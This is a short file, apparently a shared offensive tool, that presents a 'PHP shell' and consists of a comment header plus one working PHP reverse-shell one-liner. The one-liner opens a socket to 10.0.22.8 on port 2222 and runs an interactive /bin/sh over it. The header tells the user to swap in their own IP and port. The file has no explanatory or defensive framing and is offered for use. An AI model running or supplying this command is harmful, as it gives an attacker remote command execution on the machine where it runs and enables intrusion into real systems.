// XORPIOv PHP SHELL | A Reverse Shell in PHP.
// Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
//
// Description
// ------------
// Change IP Address && PORT to local IP && PORT.

php -r '$sock=fsockopen("10.0.22.8",2222);exec("/bin/sh -i <&3 >&3 2>&3");'
